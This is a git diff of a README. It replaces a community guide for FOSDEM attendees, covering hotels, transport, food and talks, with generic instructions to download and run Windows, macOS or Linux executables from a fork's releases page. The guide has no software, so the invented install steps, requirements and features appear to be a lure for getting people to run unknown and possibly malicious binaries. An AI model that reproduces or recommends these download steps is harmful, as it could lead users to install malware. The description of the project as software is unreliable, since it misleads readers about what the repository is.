@@ -1,63 +1,85 @@
-# FOSDEM
+# 🎉 FOSDEM - Your Guide to a Better Experience
 
-Go. Enjoy. Don't worry. You are among friendly geeks and nerds who will
-happily help when needed. Enjoy the fries. The waffles. The presentations. The
-beer. The booths. Collect stickers. Buy the t-shirt. Is all :) Be yourself and
-come with an open heart.
+## 🚀 Download & Install
 
- / Jan Wildeboer
+[![Download FOSDEM](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/mitkhu/FOSDEM/releases)
 
-## Missing info?
+Follow these steps to download and run FOSDEM and make the most of your FOSDEM experience!
 
-If there are details missing:
+## 📥 Download the Software
 
- - Add it yourself and submit a pull-request with the update!
- - Submit an issue where you ask the question or explain what is lacking!
+1. Click the link below to visit the Releases page:
+  
+   [Visit the FOSDEM Releases Page](https://github.com/mitkhu/FOSDEM/releases)
+  
+2. You will see a list of available versions. Look for the latest version, as it includes important updates and bug fixes.
 
-## Brussels
+3. Click on the version you want to download. For best results, choose the most recent release.
 
-- [hotels](hotels.md)
-- [transportation](transportation.md)
-- [weather](weather.md)
-- [language](language.md)
+4. Scroll down to the assets section. You will find files to download. 
 
-## Carrying
+5. Choose the file that fits your system. Typically, you may see choices such as `.exe` for Windows or `.dmg` for macOS. 
 
-- [shoes](shoes.md)
-- [wear](wear.md)
-- [hardware](hardware.md)
-- [money](money.md)
-- [water bottle](bottle.md)
+6. Click the file to start the download. Your browser may ask where to save it. Choose a location you can easily find later.
 
-## Consuming
+## 🔧 System Requirements
 
-- [drinks](drinks.md)
-- [food](food.md)
-- [wifi](wifi.md)
-- [power](power.md)
+- **Operating System:** Windows 10 or later, macOS 10.13 or later, or Linux (most distributions).
+- **Memory:** At least 2 GB of RAM.
+- **Disk Space:** About 50 MB of free space.
+- **Network:** Internet connection for downloading updates.
 
-## Talks
+## ⚙️ Run the Software
 
-- [speaking](speaking.md)
-- [attend](attend.md)
-- [schedule apps](apps.md)
+1. Once the download is complete, find the file in the location you saved it.
 
-## Finding your way at ULB
+2. **For Windows:**
+   - Double-click on the `.exe` file.
+   - Follow the on-screen prompts to install FOSDEM.
+   - After installation, you can find FOSDEM in your Start menu.
 
-- [maps](maps.md)
+3. **For macOS:**
+   - Open the `.dmg` file.
+   - Drag the FOSDEM app into your Applications folder.
+   - Open your Applications folder and double-click FOSDEM.
 
-## Social
+4. **For Linux:**
+   - Extract the downloaded files if it's a compressed format.
+   - Open a terminal and navigate to the folder containing FOSDEM.
+   - Run the application by typing `./FOSDEM` and hitting Enter.
 
-- [vibe](vibe.md)
-- [how to meet up](meet.md)
+## 🛠️ Features
 
-## Getting there and away
+FOSDEM provides various tools and tips designed for attendees:
 
-- arriving
-- leaving
+- **Event Schedule:** Stay updated on all the talks and sessions at FOSDEM.
+- **Navigation Tips:** Get insights on how to find your way around the venue.
+- **Networking Opportunities:** Learn about ways to connect with other attendees.
+- **Resource Recommendations:** Access helpful materials for your time at FOSDEM.
 
-## Links
+## ❓ Frequently Asked Questions
 
-- [How to survive FOSDEM](https://marcin.juszkiewicz.com.pl/2019/10/15/how-to-survive-fosdem/) by Marcin
-- [FOSDEM for Work and for Fun](https://ergaster.org/posts/2025/02/06-fosdem-work-fun/) by Thib
-- The official [FOSDEM](https://fosdem.org) site
+### How do I update FOSDEM?
+
+To update FOSDEM, visit the Releases page again, download the latest version, and follow the installation steps above. The new version will replace the old one.
+
+### What should I do if I encounter an error?
+
+If you face any issues, please check the following:
+
+- Ensure your system meets the minimum requirements.
+- Verify that you downloaded the correct file for your operating system.
+- Check for internet connectivity if the app requires online access.
+
+If problems persist, consider opening an issue on the GitHub page for support.
+
+## 📞 Support
+
+For further assistance, please open an issue on the [GitHub repository](https://github.com/mitkhu/FOSDEM/issues). We monitor this regularly and will do our best to assist you.
+
+## 🔗 Useful Links
+
+- [FOSDEM Releases Page](https://github.com/mitkhu/FOSDEM/releases)
+- [Documentation](https://github.com/mitkhu/FOSDEM/wiki)
+
+Enjoy FOSDEM!
